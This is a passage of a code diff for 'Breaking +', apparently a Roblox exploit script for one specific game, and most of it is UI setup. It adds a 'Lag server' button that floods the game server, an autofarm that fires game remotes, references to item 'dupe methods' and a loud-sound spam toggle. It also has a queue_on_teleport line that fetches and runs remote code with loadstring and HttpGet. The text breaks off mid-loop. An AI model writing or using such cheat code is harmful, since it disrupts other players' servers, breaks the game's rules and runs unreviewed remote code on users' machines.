+	end)
+	Button.MouseLeave:Connect(function()
+		if AnimationHappening == false then
+			game:GetService("TweenService"):Create(Button.glow,TweenInfo.new(0.2),{ImageTransparency = 1}):Play()
+		end
+	end)
+end
+--
+local SettingScroll = UI.setting.ScrollingFrame
+local Settings = SettingScroll:FindFirstChild("performance"):Clone()
+repeat task.wait() until Settings:FindFirstChild("sframe") ~= nil
+local Feature = Settings:FindFirstChild("sframe")
+local Feature2 = Feature:Clone()
+local Feature3 = Feature:Clone()
+local Feature4 = Feature:Clone()
+local Feature5 = Feature:Clone()
+local Feature6 = Feature:Clone()
+local Feature7 = Feature:Clone()
+--[[
+  CheckFile("BreakingPlus/Feature1.txt","false")
+  CheckFile("BreakingPlus/Feature2.txt","false")
+  CheckFile("BreakingPlus/Feature3.txt","false")
+CheckFile("BreakingPlus/Feature4.txt","false")
+CheckFile("BreakingPlus/Feature5.txt","false")
+CheckFile("BreakingPlus/Feature6.txt","false")
+]]
+Feature.TextLabel.Text = "Hide Blood"
+Feature2.TextLabel.Text = "Improve UI"
+Feature3.TextLabel.Text = "FullBright"
+Feature4.TextLabel.Text = "Instant Respawn"
+Feature5.TextLabel.Text = "Play Loud Noise"
+Feature6.TextLabel.Text = "Debug messages"
+Feature7.TextLabel.Text = "Legacy autofarm"
+Feature5.Parent = Settings
+Feature6.Parent = Settings
+Feature4.Parent = Settings
+Feature3.Parent = Settings
+Feature2.Parent = Settings
+Feature7.Parent = Settings
+Feature2.Position = UDim2.new(0,0,0,55)
+Feature3.Position = UDim2.new(0,0,0,85)
+Feature4.Position = UDim2.new(0,0,0,115)
+Feature5.Position = UDim2.new(0,0,0,145)
+Feature6.Position = UDim2.new(0,0,0,175)
+Feature7.Position = UDim2.new(0,0,0,205)
+Settings.Parent = SettingScroll
+Settings.Name = "breakingplus"
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Parent = Settings:FindFirstChild("TextLabel")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,255,174)),
+    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 160, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 160, 255))
+})
+Settings:FindFirstChild("TextLabel").Text = "Breaking +"
+Settings.Position = UDim2.new(0, 0, 0, 600)
+
+local UIBluring = false
+local Legacy = true
+local BindEvent = Instance.new("BindableEvent")
+
+task.spawn(function()
+if ReturnData("TutSettings.txt") == "false" then
+	UI.setting.Visible = false
+local Tween = game:GetService("TweenService"):Create(SettingButton,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{ImageColor3 = Color3.fromRGB(100,15,15)})
+local Tween2 = game:GetService("TweenService"):Create(SettingButton,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{ImageColor3 = Color3.fromRGB(255, 255, 255)})
+Tween:Play()
+local Connection
+local OpenedSettings = false
+local Connection2
+Connection2 = Tween2.Completed:Connect(function()
+if OpenedSettings == false then
+Tween:Play()
+else
+Connection2:Disconnect()
+end
+end)
+Connection = Tween.Completed:Connect(function()
+if OpenedSettings == false then
+Tween2:Play()
+else
+Connection2:Disconnect()
+end
+end)
+SettingButton.MouseButton1Click:Once(function()
+OpenedSettings = true
+ChangeData("TutSettings.txt","true")
+Tween:Pause()
+Tween2:Play()
+UI.setting.ScrollingFrame.CanvasPosition = Vector2.new(0,0)
+UI.setting.ScrollingFrame.ScrollingEnabled = false
+task.wait(0.25)
+game:GetService("TweenService"):Create(UI.setting.ScrollingFrame,TweenInfo.new(4,Enum.EasingStyle.Sine),{CanvasPosition = Vector2.new(0,662)}):Play()
+task.wait(4)
+UI.setting.ScrollingFrame.ScrollingEnabled = true
+end)
+end
+end)
+
+task.spawn(function()
+	repeat
+		task.wait()
+	until UI.loading.Text == ""
+	UI.loading.Text = "discord.gg/vAWJMYJYcR"
+end)
+
+local function CreateBlurHitbox(Origin,Position,Size,Radius,Anchor)
+local UICorner = Instance.new("UICorner")
+	local Frame = Instance.new("Frame")
+	Frame.AnchorPoint = Anchor
+	Frame.Position = Position
+	Frame.Size = Size
+	Frame.Visible = Origin.Visible
+	Frame.Name = "UIBlurFrame"
+	Frame.BackgroundTransparency = 1
+	Frame.Parent = Origin
+	UICorner.Parent = Frame
+	UICorner.CornerRadius = Radius
+	UIBlur(Frame)
+	BindEvent.Event:Connect(function()
+	if UIBluring == true then
+		Frame.Visible = Origin.Visible
+	else
+		Frame.Visible = false
+	end
+	end)
+	Origin.Changed:Connect(function()
+	if UIBluring == true then
+		Frame.Visible = Origin.Visible
+	else
+		Frame.Visible = false
+	end
+	end)
+end
+
+for i,v in pairs(UI:GetChildren()) do
+	if v.Name == "rank" then
+	CreateBlurHitbox(v,UDim2.new(0.5,0,0.5,0),UDim2.new(0.94,0,0.9,0),UDim.new(0,12),Vector2.new(0.5,0.5))
+	elseif v.Name == "setting" then
+	CreateBlurHitbox(v,UDim2.new(0.5,0,0.5,0),UDim2.new(0.94,0,0.95,0),UDim.new(0,12),Vector2.new(0.5,0.5))
+	elseif v.Name == "profile" then
+	CreateBlurHitbox(v,UDim2.new(0.5,0,0.5,0),UDim2.new(0.95,0,0.91,0),UDim.new(0,12),Vector2.new(0.5,0.5))
+	elseif v.Name == "server1" then
+	CreateBlurHitbox(v,UDim2.new(0.5,0,0.025,0),UDim2.new(0.94,0,0.86,0),UDim.new(0,12),Vector2.new(0.5,0))
+	elseif v.Name == "decision" then
+	CreateBlurHitbox(v,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),UDim.new(0,10),Vector2.new(0,0))
+	end
+end
+
+Feature7Function = function()
+	Legacy = true
+	ChangeData("Feature7.txt","true")
+end
+Feature7UnFunction = function()
+	Legacy = false
+	ChangeData("Feature7.txt","false")
+end
+SettingsToggleButton(Feature7,Feature7Function,Feature7UnFunction)
+pcall(function()
+	if ReturnData("Feature7.txt") == "false" then
+		Feature7.Autosave.ImageButton.fill.Visible = false
+		Feature7.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature7UnFunction()
+	elseif ReturnData("Feature7.txt") == "true" then
+		Feature7.Autosave.ImageButton.fill.Visible = true
+		Feature7.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature7Function()
+	else
+		Feature7.Autosave.ImageButton.fill.Visible = false
+		Feature7.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature5Function()
+		DefaultData("Feature7.txt","true")
+	end
+end)
+
+Feature6Function = function()
+	ChangeData("Feature6.txt","true")
+	Debugging = true
+	Debug("Started debugging")
+end
+Feature6UnFunction = function()
+	ChangeData("Feature6.txt","false")
+	Debugging = false
+	Debug("Stopped debugging")
+end
+SettingsToggleButton(Feature6,Feature6Function,Feature6UnFunction)
+pcall(function()
+	if ReturnData("Feature6.txt") == "false" then
+		Feature6.Autosave.ImageButton.fill.Visible = false
+		Feature6.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature6UnFunction()
+	elseif ReturnData("Feature6.txt") == "true" then
+		Feature6.Autosave.ImageButton.fill.Visible = true
+		Feature6.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature6Function()
+	else
+		Feature6.Autosave.ImageButton.fill.Visible = false
+		Feature6.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature6UnFunction()
+		DefaultData("Feature6.txt","false")
+	end
+end)
+
+Feature5Function = function()
+	ChangeData("Feature5.txt","true")
+	SpamSound = true
+	Debug("Started spamming loud sounds")
+end
+Feature5UnFunction = function()
+	ChangeData("Feature5.txt","false")
+	SpamSound = false
+	Debug("Stopped spamming loud sounds")
+end
+SettingsToggleButton(Feature5,Feature5Function,Feature5UnFunction)
+pcall(function()
+	if ReturnData("Feature5.txt") == "false" then
+		Feature5.Autosave.ImageButton.fill.Visible = false
+		Feature5.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature5UnFunction()
+	elseif ReturnData("Feature5.txt") == "true" then
+		Feature5.Autosave.ImageButton.fill.Visible = true
+		Feature5.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature5Function()
+	else
+		Feature5.Autosave.ImageButton.fill.Visible = true
+		Feature5.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature5UnFunction()
+		DefaultData("Feature5.txt","false")
+		
+	end
+end)
+
+
+
+
+Feature4Function = function()
+	ChangeData("Feature4.txt","true")
+	Die = true
+	Debug("Started instant respawning")
+end
+Feature4UnFunction = function()
+	ChangeData("Feature4.txt","false")
+	Die = false
+	Debug("Stopped instant respawning")
+end
+SettingsToggleButton(Feature4,Feature4Function,Feature4UnFunction)
+pcall(function()
+	if ReturnData("Feature4.txt") == "false" then
+		Feature4.Autosave.ImageButton.fill.Visible = false
+		Feature4.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature4UnFunction()
+	elseif ReturnData("Feature4.txt") == "true" then
+		Feature4.Autosave.ImageButton.fill.Visible = true
+		Feature4.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature4Function()
+	else
+		Feature4.Autosave.ImageButton.fill.Visible = true
+		Feature4.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature4UnFunction()
+		DefaultData("Feature4.txt","false")
+		
+	end
+end)
+
+Feature3Function = function()
+	ChangeData("Feature3.txt","true")
+	game.Lighting.Ambient = Color3.fromRGB(100,100,100)
+	game.Lighting.Brightness = 5
+	Debug("Enabled fullbright")
+end
+Feature3UnFunction = function()
+	ChangeData("Feature3.txt","false")
+	game.Lighting.Ambient = Color3.fromRGB(0,0,0)
+	game.Lighting.Brightness = 0
+	Debug("Disabled fullbright")
+end
+SettingsToggleButton(Feature3,Feature3Function,Feature3UnFunction)
+pcall(function()
+	if ReturnData("Feature3.txt") == "false" then
+		Feature3.Autosave.ImageButton.fill.Visible = false
+		Feature3.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature3UnFunction()
+	elseif ReturnData("Feature3.txt") == "true" then
+		Feature3.Autosave.ImageButton.fill.Visible = true
+		Feature3.Autosave.ImageButton.fill.ImageTransparency = 0
+		Feature3Function()
+	else
+		Feature3UnFunction()
+		DefaultData("Feature3.txt","false")
+	end
+end)
+FeatureFunction = function()
+	ChangeData("Feature1.txt","true")
+	HideBlood = false
+	game:GetService("CoreGui"):WaitForChild("TopBarApp",15):FindFirstChild("FullScreenFrame").Visible = false
+	Debug("Started hiding blood")
+end
+FeatureUnFunction = function()
+	ChangeData("Feature1.txt","false")
+	HideBlood = true
+	Debug("Stopped hiding blood")
+end
+SettingsToggleButton(Feature,FeatureFunction,FeatureUnFunction)
+pcall(function()
+	if ReturnData("Feature1.txt") == "false" then
+		Feature.Autosave.ImageButton.fill.Visible = false
+		Feature.Autosave.ImageButton.fill.ImageTransparency = 0
+		FeatureUnFunction()
+	elseif ReturnData("Feature1.txt") == "true" then
+		Feature.Autosave.ImageButton.fill.Visible = true
+		Feature.Autosave.ImageButton.fill.ImageTransparency = 0
+		FeatureFunction()
+	else
+		FeatureUnFunction()
+		DefaultData("Feature1.txt","false")
+	end
+end)
+Feature2Function = function()
+	ChangeData("Feature2.txt","true")
+	UIBluring = true
+	BindEvent:Fire()
+	local Value = Instance.new("Model",game.CoreGui)
+	Value.Name = "ImproveUI"
+	UI.setting.ImageLabel.ImageColor3 = Color3.fromRGB(15,15,15)
+	UI.server1.ImageLabel.ImageColor3 = Color3.fromRGB(15,15,15)
+	UI.profile.ImageLabel.ImageColor3 = Color3.fromRGB(20,20,20)
+	UI.rank.ImageLabel.ImageColor3 = Color3.fromRGB(20,20,20)
+	local UICorner = Instance.new("UICorner")
+	UICorner.CornerRadius = UDim.new(0,10)
+	local UICorner2 = Instance.new("UICorner")
+	UICorner2.CornerRadius = UDim.new(0,5)
+	UICorner:Clone().Parent = UI.decision
+	UICorner2:Clone().Parent = UI.decision.public
+	UICorner2:Clone().Parent = UI.decision.secret
+	UI.decision.secret.BackgroundColor3 = Color3.fromRGB(5,5,5)
+	task.spawn(function()
+		UI.shop.sectionframes.ChildAdded:Wait()
+		if ReturnData("Feature2.txt") == "true" then
+			local found = false
+			local thefound = nil
+			for i,v in pairs(UI.shop.sectionbuttons:GetChildren()) do
+				if v:FindFirstChild("TextLabel") and v:FindFirstChild("TextLabel").Text == "Other" then
+					thefound = v:FindFirstChild("ImageButton")
+					found = true
+				end
+			end
+			if found == true then
+				thefound.Image = "rbxassetid://17375911551"
+			end
+		end
+	end)
+	local found = false
+	local thefound = nil
+	for i,v in pairs(UI.shop.sectionbuttons:GetChildren()) do
+		if v:FindFirstChild("TextLabel") and v:FindFirstChild("TextLabel").Text == "Other" then
+			thefound = v:FindFirstChild("ImageButton")
+			found = true
+		end
+	end
+	if found == true then
+		thefound.Image = "rbxassetid://17375911551"
+	end
+	Debug("Added improvements to the UI")
+end
+Feature2UnFunction = function()
+	ChangeData("Feature2.txt","false")
+	UIBluring = false
+	BindEvent:Fire()
+	if game.CoreGui:FindFirstChild("ImproveUI") then
+		UI.decision.secret.BackgroundColor3 = Color3.fromRGB(27,27,27)
+		UI.server1.ImageLabel.ImageColor3 = Color3.fromRGB(30,30,30)
+		UI.setting.ImageLabel.ImageColor3 = Color3.fromRGB(30,30,30)
+		UI.profile.ImageLabel.ImageColor3 = Color3.fromRGB(30,30,30)
+		UI.rank.ImageLabel.ImageColor3 = Color3.fromRGB(30,30,30)
+		UI.decision.secret:FindFirstChild("UICorner"):Destroy()
+		UI.decision.public:FindFirstChild("UICorner"):Destroy()
+		UI.decision:FindFirstChild("UICorner"):Destroy()
+		game.CoreGui:FindFirstChild("ImproveUI"):Destroy()
+		if UI.setting:FindFirstChild("BlurFrame") then
+			UI.setting:FindFirstChild("BlurFrame").Visible = false
+			task.wait()
+			UI.setting:FindFirstChild("BlurFrame"):Destroy()
+			workspace.CurrentCamera:ClearAllChildren()
+			for i,v in game.Lighting:GetChildren() do
+				if v.Name == "DepthOfField" then
+					v:Destroy()
+			end
+			end
+		end
+		local found = false
+		local thefound = nil
+		for i,v in pairs(UI.shop.sectionbuttons:GetChildren()) do
+			if v:FindFirstChild("TextLabel") and v:FindFirstChild("TextLabel").Text == "Other" then
+				thefound = v:FindFirstChild("ImageButton")
+				found = true
+			end
+		end
+		if found == true then
+			thefound.Image = "rbxassetid://0"
+		end
+	else
+	end
+	Debug("Removed the improvements to the UI")
+end
+if ReturnData("Feature2.txt") == "false" then
+	Feature2.Autosave.ImageButton.fill.Visible = false
+	Feature2.Autosave.ImageButton.fill.ImageTransparency = 0
+	Feature2UnFunction()
+elseif ReturnData("Feature2.txt") == "true" then
+	Feature2.Autosave.ImageButton.fill.Visible = true
+	Feature2.Autosave.ImageButton.fill.ImageTransparency = 0
+	Feature2Function()
+else
+	Feature2.Autosave.ImageButton.fill.Visible = false
+	Feature2.Autosave.ImageButton.fill.ImageTransparency = 0
+	Feature2UnFunction()
+	DefaultData("Feature2.txt","false")
+end
+SettingsToggleButton(Feature2,Feature2Function,Feature2UnFunction)
+SettingScroll.CanvasSize = UDim2.new(0, 0, 0, 830)
+UI.buttons.shop.ImageButton.Position = UDim2.new(1.025,0,0,35)
+UI.buttons.shop.ImageButton.Visible = true
+UI.version.Text = UI.version.Text .. " | V" .. tostring(Version)
+UI.version.Size = UDim2.new(0, 100, 0, 25)
+local BackgroundUI =   UI.mockinv.top.everydivine:Clone()
+BackgroundUI.Parent = CustomMenu.top 
+BackgroundUI.Visible = true
+BackgroundUI.ImageColor3 = Color3.fromRGB(0, 255, 196)
+BackgroundUI.ImageTransparency = 0.45
+CustomMenu.top.TextButton.ZIndex = 2
+ClonedCredits.Parent = CustomMenu.top
+ClonedCredits.ZIndex = 2
+local Rejoin = UI.buttons.inv:Clone()
+Rejoin.Parent = CustomMenu
+Rejoin.Name = "rejoin"
+Rejoin.Position = UDim2.new(0.375, 0, 0.75, 35)
+Rejoin.ImageColor3 = Color3.fromRGB(47, 121, 255)
+Rejoin.TextLabel.Text = "Rejoin"
+Rejoin.MouseButton1Click:Connect(function()
+	rejoin(true)
+end)
+Rejoin.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(Rejoin,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+Rejoin.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(Rejoin,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+local Respawn = UI.buttons.inv:Clone()
+Respawn.Parent = CustomMenu
+Respawn.Name = "respawn"
+Respawn.Position = UDim2.new(0.65, 0, 0.625, 35)
+Respawn.ImageColor3 = Color3.fromRGB(255, 255, 255)
+Respawn.TextLabel.Text = "Respawn"
+Respawn.MouseButton1Click:Connect(function()
+	respawn(false)
+end)
+Respawn.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(Respawn,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+Respawn.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(Respawn,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+local Refresh = UI.buttons.inv:Clone()
+Refresh.Parent = CustomMenu
+Refresh.Name = "refresh"
+Refresh.Position = UDim2.new(0.65, 0, 0.5, 35)
+Refresh.ImageColor3 = Color3.fromRGB(255, 255, 255)
+Refresh.TextLabel.Text = "Refresh"
+Refresh.MouseButton1Click:Connect(function()
+	if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+		local OldPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
+		local CamPos = workspace.CurrentCamera.CFrame
+		respawn(false)
+		LocalPlayer.CharacterAdded:Once(function(char)
+			task.wait()
+			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = OldPos
+			wait()
+			workspace.CurrentCamera.CFrame = CamPos
+			
+		end)
+	elseif game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
+		local OldPos = game.Players.LocalPlayer.Character:FindFirstChild("Torso").CFrame
+		local CamPos = workspace.CurrentCamera.CFrame
+		respawn(false)
+		LocalPlayer.CharacterAdded:Once(function(char)
+			task.wait()
+			game.Players.LocalPlayer.Character:FindFirstChild("Torso").CFrame = OldPos
+			wait()
+			workspace.CurrentCamera.CFrame = CamPos
+		end)
+	else
+		Notify("Could not refresh | Did not find torso/root. (Suggest to respawn)")
+	end
+end)
+Refresh.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(Refresh,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+Refresh.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(Refresh,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+local ServerHop = UI.buttons.inv:Clone()
+ServerHop.Parent = CustomMenu
+ServerHop.Name = "serverhop"
+ServerHop.Position = UDim2.new(0.65, 0, 0.75, 35)
+ServerHop.ImageColor3 = Color3.fromRGB(166, 255, 137)
+ServerHop.TextLabel.Text = "Server hop"
+ServerHop.MouseButton1Click:Connect(function()
+	serverhop(true)
+end)
+ServerHop.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(ServerHop,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+ServerHop.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(ServerHop,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+local Lag = UI.buttons.inv:Clone()
+Lag.Parent = CustomMenu
+Lag.Name = "lag"
+Lag.Position = UDim2.new(0.095, 0, 0.75, 35)
+Lag.ImageColor3 = Color3.fromRGB(155, 0, 0)
+Lag.TextLabel.Text = "Lag server"
+local Sent = false
+task.spawn(function()
+	while true do
+		task.wait()
+		if Sent == true then
+			lag(4,false)
+		end
+	end
+end)
+Lag.MouseButton1Click:Connect(function()
+	if Sent == false then
+		Lag.TextLabel.Text = "Stop lagging"
+		Sent = true
+	else
+		Lag.TextLabel.Text = "Lag server"
+		Sent = false
+	end
+end)
+Lag.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(Lag,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+Lag.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(Lag,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+task.spawn(function()
+	ClassicCredits.Changed:Connect(function()
+		ClonedCredits.Text = ClassicCredits.Text
+		Credits = tonumber(ClassicCredits.Text:sub(-ClassicCredits.Text:len(),-8))
+	end)
+end)
+local AutoFarm = UI.buttons.inv:Clone()
+AutoFarm.Parent = CustomMenu
+AutoFarm.Name = "autofarm"
+AutoFarm.Position = UDim2.new(0.375, 0, 0.625, 35)
+AutoFarm.ImageColor3 = Color3.fromRGB(255, 60, 0)
+AutoFarm.TextLabel.Text = "Disable autofarm"
+AutoFarm.TextLabel.TextSize = 11
+AutoFarm.MouseButton1Click:Connect(function()
+	if Sent2 == true then
+		Sent2 = false 
+
+		AutoFarm.ImageColor3 = Color3.fromRGB(0, 225, 225)
+		AutoFarm.TextLabel.Text = "Enable autofarm"
+		respawn(false)
+	else
+		Sent2 = true 
+		AutoFarm.ImageColor3 = Color3.fromRGB(255, 60, 0)
+		AutoFarm.TextLabel.Text = "Disable autofarm"
+	end
+end)
+AutoFarm.MouseEnter:Connect(function()
+	game:GetService("TweenService"):Create(AutoFarm,TweenInfo.new(0.25),{ImageTransparency = 0}):Play()
+end)
+AutoFarm.MouseLeave:Connect(function()
+	game:GetService("TweenService"):Create(AutoFarm,TweenInfo.new(0.25),{ImageTransparency = 0.5}):Play()
+end)
+
+CustomMenu.Name = "Breaking+"
+CustomMenu.top.TextLabel:FindFirstChildOfClass("ImageLabel"):Destroy()
+CustomMenu.top.TextLabel.Text = "Breaking +"
+CustomMenu.top.TextLabel.ZIndex = 2
+CustomButton.ImageColor3 = Color3.fromRGB(0,200,125)
+CustomButton.Position = UDim2.new(0, -200, 0, 140)
+CustomButton.TextLabel.Text = "Breaking +"
+CustomButton.Name = "Breaking+"
+CustomButton.Visible = true
+game:GetService("TweenService"):Create(CustomButton,TweenInfo.new(0.5),{Position = UDim2.new(0, 0, 0, 140)}):Play()
+--[[
+PlayerButtons.Changed:Connect(function()
+	if PlayerButtons:FindFirstChildOfClass("UIListLayout") then
+
+	else
+		local Layout = Instance.new("UIListLayout")
+		local Padding = Instance.new("UIPadding")
+		Layout.Parent = PlayerButtons
+		Layout.Padding = UDim.new(0,-3)
+		Padding.Parent = PlayerButtons
+		Padding.PaddingLeft = UDim.new(1,0)
+		game:GetService("TweenService"):Create(Padding,TweenInfo.new(0.15, Enum.EasingStyle.Linear),{PaddingLeft = UDim.new(0,0)}):Play()
+	end
+end)
+]]
+--[[
+PlayerButtons.ChildAdded:Connect(function()
+	if PlayerButtons:FindFirstChildOfClass("UIListLayout") then
+
+	else
+	---	local Layout = Instance.new("UIListLayout")
+	--	local Padding = Instance.new("UIPadding")
+	--	Layout.Parent = PlayerButtons
+	--	Layout.Padding = UDim.new(0,-3)
+	--	Padding.Parent = PlayerButtons
+	--	Padding.PaddingLeft = UDim.new(1,0)
+	--	game:GetService("TweenService"):Create(Padding,TweenInfo.new(0.15, Enum.EasingStyle.Linear),{PaddingLeft = UDim.new(0,0)}):Play()
+	end
+end)
+]]
+function PlayerExecute(Player)
+	task.wait()
+	if Player ~= LocalPlayer then
+		PlayerButtons.Size = UDim2.new(0,130,0,120)
+		local Cloned = PlayerButtons:FindFirstChild("button"):Clone()
+		Cloned.Position = UDim2.new(2, 0, 0, 81)
+		Cloned.Parent = PlayerButtons
+		Cloned.TextLabel.Text = "Trade"
+		Cloned.ImageColor3 = Color3.fromRGB(14, 35, 14)
+		Cloned.button.ImageColor3 = Color3.fromRGB(85, 170, 0)
+		local Connection
+		Connection = PlayerButtons:FindFirstChild("button").Changed:Connect(function()
+		if PlayerButtons:FindFirstChild("button").Position.X.Scale ~= 0 then
+		Cloned.Position = UDim2.new(PlayerButtons:FindFirstChild("button").Position.X.Scale,0,0,81)
+			else
+				Connection:Disconnect()
+		end
+	end)
+		Cloned.MouseEnter:Connect(function()
+			game:GetService("TweenService"):Create(Cloned.button,TweenInfo.new(0.1, Enum.EasingStyle.Linear),{ImageTransparency = 0.8}):Play()
+		end)
+		Cloned.MouseLeave:Connect(function()
+			game:GetService("TweenService"):Create(Cloned.button,TweenInfo.new(0.1, Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
+		end)
+		Cloned.MouseButton1Click:Connect(function()
+			PlayerButtons.Visible = false
+			game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(73,Player)
+		end)
+	else
+		PlayerButtons.Size = UDim2.new(0,130,0,60)
+		local Cloned = PlayerButtons:FindFirstChild("button"):Clone()
+		Cloned.Position = UDim2.new(2, 0, 0, 27)
+		Cloned.Parent = PlayerButtons
+		Cloned.TextLabel.Text = "Headless"
+		Cloned.ImageColor3 = Color3.fromRGB(38, 11, 11)
+		Cloned.button.ImageColor3 = Color3.fromRGB(125, 15, 15)
+		local Connection
+		Connection = PlayerButtons:FindFirstChild("button").Changed:Connect(function()
+		if PlayerButtons:FindFirstChild("button").Position.X.Scale ~= 0 then
+		Cloned.Position = UDim2.new(PlayerButtons:FindFirstChild("button").Position.X.Scale,0,0,27)
+			else
+				Connection:Disconnect()
+		end
+		end)
+		Cloned.MouseEnter:Connect(function()
+			game:GetService("TweenService"):Create(Cloned.button,TweenInfo.new(0.1, Enum.EasingStyle.Linear),{ImageTransparency = 0.8}):Play()
+		end)
+		Cloned.MouseLeave:Connect(function()
+			game:GetService("TweenService"):Create(Cloned.button,TweenInfo.new(0.1, Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
+		end)
+		
+		Cloned.MouseButton1Click:Connect(function()
+			PlayerButtons.Visible = false
+			LocalPlayer.Character.Torso.Neck.C1 = CFrame.new(0,0,100)
+			game:GetService("ReplicatedStorage").RemoteEvent:FireServer("neck",(CFrame.new(0,100,0) * CFrame.Angles(-1.6130179166793823, 0, 3)))
+		end)
+	end
+end
+
+for i,v in pairs(PlayersList:GetChildren()) do
+	if v:IsA("Frame") and v:FindFirstChild("name") and v.name:FindFirstChild("TextButton") then
+		v.name:FindFirstChild("TextButton").MouseButton1Click:Connect(function()
+			SelectedPlayer = game.Players:FindFirstChild(v.name:FindFirstChild("TextLabel").Text)
+			PlayerExecute(SelectedPlayer)
+		end)
+	end
+end
+PlayersList.ChildAdded:Connect(function(v)
+	if v:IsA("Frame") and v:FindFirstChild("name") and v.name:FindFirstChild("TextButton") then
+		v.name:FindFirstChild("TextButton").MouseButton1Click:Connect(function()
+			SelectedPlayer = game.Players:FindFirstChild(v.name:FindFirstChild("TextLabel").Text)
+			PlayerExecute(SelectedPlayer)
+		end)
+	end
+end)
+
+task.spawn(function()
+for i,v in pairs(UI.trade.Frame.ScrollingFrame:GetChildren()) do
+	repeat task.wait() until game.Players:FindFirstChild(v.Name):FindFirstChild("tradebanned") or task.wait(3)
+	if game.Players:FindFirstChild(v.Name) and game.Players:FindFirstChild(v.Name):FindFirstChild("tradebanned").Value == true then
+	v.grad.ImageColor3 = Color3.fromRGB(255, 195, 195)
+	v.TextLabel.TextColor3 = Color3.fromRGB(133, 47, 47)
+	v.ImageLabel.ImageColor3 = Color3.fromRGB(35, 27, 27)
+	end
+end
+end)
+
+UI.trade.Frame.ScrollingFrame.ChildAdded:Connect(function(v)
+	repeat task.wait() until game.Players:FindFirstChild(v.Name):FindFirstChild("tradebanned") or task.wait(3)
+	if game.Players:FindFirstChild(v.Name) and game.Players:FindFirstChild(v.Name):FindFirstChild("tradebanned").Value == true then
+		v.grad.ImageColor3 = Color3.fromRGB(255, 195, 195)
+		v.TextLabel.TextColor3 = Color3.fromRGB(133, 47, 47)
+		v.ImageLabel.ImageColor3 = Color3.fromRGB(35, 27, 27)
+		end
+	end)
+
+CustomMenu.top.TextButton.MouseButton1Click:Connect(function()
+	CustomMenu.Visible = not CustomMenu.Visible
+end)
+
+CustomButton.MouseButton1Click:Connect(function()
+	if CustomMenu.Visible == false and FirstPurchasable == nil and SecondPurchasable == nil and ThirdPurchasable == nil and FourthPurchasable == nil then
+		Notify("Couldn't load dupe methods to fix this open the shop to update it")
+	end
+	CustomMenu.Visible = not CustomMenu.Visible
+	for i,v in pairs(UI:GetChildren()) do
+		task.spawn(function()
+			if v.Name == "setting" or v.Name == "trade" or v.Name == "shop" or v.Name == "inv" or v.Name == "tradelog" then
+				v.Visible = false
+			end
+		end)
+	end
+end)
+
+NeededPlaceId = 648362523
+
+local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
+if queue_on_teleport ~= nil then
+	--print(type(queue_on_teleport),queue_on_teleport)
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/NaikoScript/Breaking-Plus/main/Script'))()")
+else
+	Notify("Your exploit does not support teleport execution")
+end
+
+task.spawn(function()
+	while task.wait(0.1) do
+		if #game.Players:GetPlayers() < 8 and Sent2 == true then
+
+			game.StarterGui:SetCore(
+				"SendNotification",
+				{
+					Title = "Notification",
+					Text = "Server hopping automaticly"
+				}
+			)
+			if TeleportProc == nil then
+				TeleportProc = true
+				serverhop(true)
+				wait(15)
+			end
+		end
+	end
+end)
+
+if game.PlaceId == NeededPlaceId then
+	repeat wait() until game:IsLoaded()
+	game.StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "Notification",
+			Text = "Breaking + | V" .. tostring(Version) .. " | loaded successfully.",
+			Icon = "rbxassetid://10698497706"
+		})
+	while true do
+		if Sent2 == true then
+			task.wait()
+			if Legacy == true then
+				pcall(function()
+					game:GetService("ReplicatedStorage").RemoteEvent:FireServer(16, "public")
+				end)
+				spawn(function()
+					for i, v in pairs(game.Players:GetPlayers()) do
+						if v.Name == game.Players.LocalPlayer.Name then
+						else
